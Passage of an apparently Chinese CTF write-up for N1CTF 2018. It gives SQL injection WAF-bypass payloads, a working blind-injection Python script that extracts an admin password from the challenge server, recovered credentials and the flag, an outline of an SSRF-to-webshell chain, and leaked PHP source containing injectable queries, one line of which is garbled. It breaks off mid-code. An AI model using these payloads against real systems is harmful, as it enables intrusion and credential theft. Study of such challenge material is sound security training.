        <content type="html"><![CDATA[<h3 id="section">77777</h3><p>队友写的...这里就分析一下就好 给了源码 <img src="/images/2018/03/N1CTF-1.jpg" alt="blacsheep" /> 而且题目也说了,我们要的是admin的密码 然后就注嘛,给两个payload 工作室这边的:where ord(substr(password,[position],1))&gt;[number] -- sky的: where (password like 0x25) emmmm,第二个似乎简洁一点,就当学习一下了.. 没啥好写的</p><h3 id="section-1">77777 2</h3><p>可以通过hi来判断waf,过滤了password admin point ord ascii union left mid right information_schema order as and or having where等...(test by JHSN) 晚上想了很久怎么绕过列里面的password里面的as和or...最后想不出来..就先睡了,第二天发现题目解出来了,看了一下队友的payload,发现列名是pw,瞬间崩溃.... 依旧,两个payload 工作室的,发个记录自己体会... MitAh: DONE if((select {x pw})&gt;'h',1,0) 黑魔法 别问了 JHSN: ??????? {x 列名}可以用来bypass,具体有篇文章 <a href="https://paper.seebug.org/218/" title="https://paper.seebug.org/218/">https://paper.seebug.org/218/</a> 然后sky的: flag=10&amp;hi=%2b(pw&gt;'%s') %s表示flag 多学习新姿势...</p><h3 id="babysqli">babysqli</h3><p>二次注入,注入点都被找到了...无奈眼瞎没注意到payload执行了....(喂,不是说ctf没有视力嘛! 在userinfo那里 'or'1'='1 头像变成1.png 'or'1'='2 头像变成2.png 所以过掉waf之后就可以注了 其中因为information被ban了,所以用mysql_innodb_table_stats绕过 详情可以看<a href="http://mitah.cn/" title="http://mitah.cn/">http://mitah.cn/</a> 然后右边有个支付宝二维码XD... 列名提取不出来,猜email和password,拿到密码 登录一下,userinfo就是flag. 脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    ok=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jilu.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            num=f.read()</span><br><span class="line">            num=<span class="built_in">int</span>(num)+<span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;1&#x27;or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql_innodb_table_stats),&#123;num2&#125;,1))&gt;&#123;char&#125;#&quot;.format(num2=num2,char=char)</span></span><br><span class="line">        <span class="comment">#gtid_executed,vimg,vusers,sys_config</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27;or/**/ascii(substr((select/**/password/**/from/**/vusers/**/where/**/email=&#x27;Venenof7@nu1l.com&#x27;),&#123;num2&#125;,1))&gt;&#123;char&#125;#&quot;</span>.<span class="built_in">format</span>(num2=num2,char=char)</span><br><span class="line">        <span class="comment"># ac895b772a4ec1eff81e07aa2907afe3 -&gt; qwqa123aa</span></span><br><span class="line">        <span class="comment"># N1CTF&#123;6302fa614d6bcfc59a65b71a7535bed3&#125;</span></span><br><span class="line">        reg_data=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;infors&#123;num&#125;@nu1l.com&#x27;</span>.<span class="built_in">format</span>(num=num),<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;sleep)/*&#x27;</span>,<span class="string">&#x27;userinfo&#x27;</span>:payload&#125;</span><br><span class="line">        login_data=&#123;<span class="string">&#x27;loginuser&#x27;</span>:<span class="string">&#x27;infors&#123;num&#125;@nu1l.com&#x27;</span>.<span class="built_in">format</span>(num=num),<span class="string">&#x27;loginpass&#x27;</span>:<span class="string">&#x27;sleep)/*&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jilu.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        r=u.post(<span class="string">&#x27;http://47.75.55.61/vlogin/reg.php&#x27;</span>,data=reg_data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        r=u.post(<span class="string">&#x27;http://47.75.55.61/vlogin/login.php&#x27;</span>,data=login_data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        r=u.get(<span class="string">&#x27;http://47.75.55.61/vlogin/vpage&#x27;</span>)</span><br><span class="line">        res = re.findall(<span class="string">r&#x27;&lt;p&gt;([^&lt;]+)&lt;/p&gt;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> char==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意先建一个jilu.txt,然后里面写一个数字,方便注册 flag:N1CTF{6302fa614d6bcfc59a65b71a7535bed3}</p><h3 id="easy-php">easy php</h3><p>质量挺高的一道题,当时并没有写出来.... 乖乖姐姐最后知道怎么写了..但是时间到了.. 做出来的话就第12了...sad:( 比赛结束看各位大神的非预期解..感觉还是学得到很多东西的... 官方的大致思路sql注入拿到admin的密码,和登录ip,但是由于要本地登录,尝试寻找ssrf,然后加上crlf登录上去,然后传一个shell,然后绕过一下&lt;?,可以用短标签或者script标签传个图马,lfi拿到shell之后在run.sh里面有mysql的root密码,连接上去拿到flag,当然还有sky大佬的session.upload_progress的利用,通过条件竞争传session然后包含拿shell...一个个技巧地学吧 首先这道题一拿到,看下源码泄漏,发现index.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;views/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>泄漏,然后还有user.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>, <span class="variable">$userid</span>, <span class="variable">$is_admin</span>, <span class="variable">$allow_diff_ip</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userid = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]:-<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;is_admin = <span class="keyword">isset</span>(<span class="variable">$_</span>.<span class="number">0</span>[<span class="string">&#x27;is_admin&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_allow_diff_ip</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_username</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/is&#x27;</span>,<span class="variable">$username</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&lt;<span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_allow_diff_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;allow_diff_ip&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;allow_diff_ip = (<span class="keyword">int</span>)<span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code erroar&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">4</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="variable">$user</span>[<span class="number">2</span>] !== <span class="title function_ invoke__">get_ip</span>())</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;You can only login at the usual address&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>] = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;username = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;userid = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line"></span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="title function_ invoke__">get_ip</span>(),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)); </span><br><span class="line">                <span class="comment">//No one could be admin except me</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;The username is not unique&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$mood</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Mood</span>((<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>],<span class="title function_ invoke__">get_ip</span>())));</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="variable language_">$this</span>-&gt;userid,<span class="variable language_">$this</span>-&gt;username,<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>],<span class="variable">$mood</span>));</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;upload ok!&#x27;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    